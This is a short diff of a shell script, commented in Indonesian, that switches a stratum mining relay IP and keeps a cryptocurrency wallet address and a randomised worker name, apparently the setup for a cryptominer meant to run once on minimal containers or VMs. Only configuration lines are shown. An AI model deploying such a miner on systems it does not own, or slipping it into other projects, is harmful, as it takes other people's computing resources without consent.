@@ -3,7 +3,7 @@
 # Cocok buat container/VM minimal. Threads AUTO dari RAM. Jalankan sekali saja.
 set -euo pipefail
 
-RELAY="stratum+tcp://13.140.137.45:8443"
+RELAY="stratum+tcp://77.113.248.69:8443"
 ADDRESS="PLMGsifmTC9Zn5pHqcMkbayvzSG3SBX6vAwJts3KQCwfGRsznpv2qdyCFyRpnh46TwcQu8mLEu1CVdHdQzsx7Ty637GQc"
 WORKER="mamiku$(printf '%x%x%x%x' $RANDOM $RANDOM $RANDOM $RANDOM)"
 
